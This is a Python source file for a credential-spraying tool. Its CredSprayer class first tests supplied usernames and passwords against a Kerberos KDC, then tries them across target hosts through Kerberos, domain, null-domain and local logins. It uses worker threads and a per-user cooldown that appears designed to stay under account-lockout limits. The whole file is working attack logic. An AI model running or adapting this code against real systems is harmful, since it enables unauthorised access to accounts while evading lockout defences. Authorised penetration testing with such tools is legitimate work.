import queue
import time
from WMClass import *
from CMClass import *
from TargetClass import *
from AuthClasses import *


# NOTE:
#   Raw Kerberos Auths (Auth to kerberos directly) are treated as Domain Auths.
#   This keeps the implemetations abstract and removes the need for
#   speciality classes for special situations, such as when a kdc is given, but
#   other open kerberos ports were found on other hosts.
#   We want to isolate the KDC auths and not auth to services with creds that do not work for
#   that kdc, but we still want to try those creds against the other hosts that have kerberos
#   open.

# NOTE: On the time.sleep(0.001) in the spray...
#   I don't know why, but several Auth attempts (were)
#   lag behind severly. Current situation is 5 usernames, 1 & 2 go through on
#   time, but the next 3 lag behind by several seconds (30+). The only solution
#   is to have this time sleep here, which will reduce the lag to maybe a second
#   or 2, which is understandable (Network time + KDC processing time). But I have
#   0 fucking idea why there is lag in the first place and why having the sleep
#   here makes any difference. So dont remove it. Best guess is it is something
#   weird under the hood with python and how it handles recources with threading.
#
# UPDATE: 1 & 2 were fake 3, 4, & 5 are real, which is why there is a slight
#   lag and makes sense. But the initial lag when there is not this sleep
#   still doesn't make since. Also, Kerberos Time-Based User Enumeration is hype.


class CredSprayer:
    def __init__(self, creds, targets, domain=None, kdc=None):
        self.creds = creds
        self.targets = targets
        self.domain = domain
        self.kdc = kdc
        
        if self.domain: # If domain is pre-set
            for i in range(len(self.targets)):
                self.targets[i].domain = self.domain

        if self.kdc:
            if not self.domain:
                raise Exception('Domain required when using KDC')
            
            for i in range(len(self.targets)):
                self.targets[i].kdc = self.kdc
            
            self.kdc_target = Target(self.kdc, '88', 'kerberos', '', self.domain,self.kdc)

            # Remove the given KDC from the targeting lists if present
            for i in range(len(self.targets)):
                if self.kdc_target.get_hpp_id() == self.targets[i].get_hpp_id():
                    self.targets.pop(i) # Might need to pop into self.kdc_target (Blank hostname might cause issues idk)
                    break
    
    # Wrapper for running the check func of Auth objects
    def check_auth(self, auth):
        #print(auth.cred.username, auth.cred.secret)
        auth.check()
        return auth

    def spray(self,
              max_fail_counters=0,
              counter_reset_time=0,
              num_threads=5,
              color=True,
              success_only=False
            ):

        auth_queue = queue.Queue()
        result_queue = queue.Queue()

        cm = CooldownManager(
            items=[c.username for c in self.creds],
            max_counters=max_fail_counters,
            time_limit=counter_reset_time
        )



        # Stage 1: Prepare KDC Auths
        kdc_auths = []
        for c in self.creds:
            k = DOMAIN_AUTH(self.kdc_target, c)
            kdc_auths.append(k)



        # Stage 2: Check the KDC Auths
        valid_kdc_creds = []
        
        wm = WorkerManager(
            worker_func=self.check_auth,
            num_threads=num_threads,
            input_queue=auth_queue,
            output_queue=result_queue,
        )

        wm.start_threads()
        while kdc_auths:
            if not cm.all_unavailable():
                username = cm.check_out()
                found_match = False

                for i in range(len(kdc_auths)):
                    if kdc_auths[i].cred.username == username:
                        a = kdc_auths.pop(i)
                        auth_queue.put(a)
                        found_match = True
                        break
                
                if not found_match:
                    cm.exclude_item(username)


            while not result_queue.empty():
                a = result_queue.get()
                cm.check_in(a.cred.username) # Start the cooldown timer after the response is completed
                if a.success:
                    valid_kdc_creds.append(a.cred.get_cred_id())

                if success_only:
                    if a.success:
                        a.print()
                else:
                    a.print()


            time.sleep(0.001) # Fix for valid auth lag

        wm.join_threads()

        # Make sure results_queue is flushed
        while not result_queue.empty():
            a = result_queue.get()
            cm.check_in(a.cred.username) # Start the cooldown timer after the response is completed
            if a.success:
                valid_kdc_creds.append(a.cred.get_cred_id())

            if success_only:
                if a.success:
                    a.print()
            else:
                a.print()

        cm.reset_checkout()
        cm.reset_excluded()



        # Stage 3: Prepare other Auths based on results from Stage 2
        auths = []
        for c in self.creds:
            for t in self.targets:
                if c.get_cred_id() in valid_kdc_creds:
                    auths.append(KERBEROS_AUTH(t, c))
                auths.append(NULL_DOMAIN_AUTH(t, c))
                auths.append(LOCAL_AUTH(t, c))
                auths.append(DOMAIN_AUTH(t, c))



        # Stage 4: Run all other Auths
        wm = WorkerManager(
            worker_func=self.check_auth,
            num_threads=num_threads,
            input_queue=auth_queue,
            output_queue=result_queue,
        )

        wm.start_threads()
        while auths:
            if not cm.all_unavailable():
                username = cm.check_out()
                found_match = False

                for i in range(len(auths)):
                    if auths[i].cred.username == username:
                        a = auths.pop(i)
                        auth_queue.put(a)
                        found_match = True
                        break
                
                if not found_match:
                    cm.exclude_item(username)
            

            while not result_queue.empty():
                a = result_queue.get()
                if a.success == None:
                    # If an attempt wasn't even made, don't count against the cooldown
                    cm.check_in_no_count(a.cred.username)
                else:
                    cm.check_in(a.cred.username) # Start the cooldown timer after the response is completed
                    if success_only:
                        if a.success:
                            a.print()
                    else:
                        a.print()
            
            time.sleep(0.001) # Fix for valid auth lag

        wm.join_threads()

        while not result_queue.empty():
            a = result_queue.get()
            if a.success == None:
                # If an attempt wasn't even made, don't count against the cooldown
                cm.check_in_no_count(a.cred.username)
            else:
                cm.check_in(a.cred.username) # Start the cooldown timer after the response is completed
                if success_only:
                    if a.success:
                        a.print()
                else:
                    a.print()

        # Not needed but here for consistancy
        cm.reset_checkout()
        cm.reset_excluded()




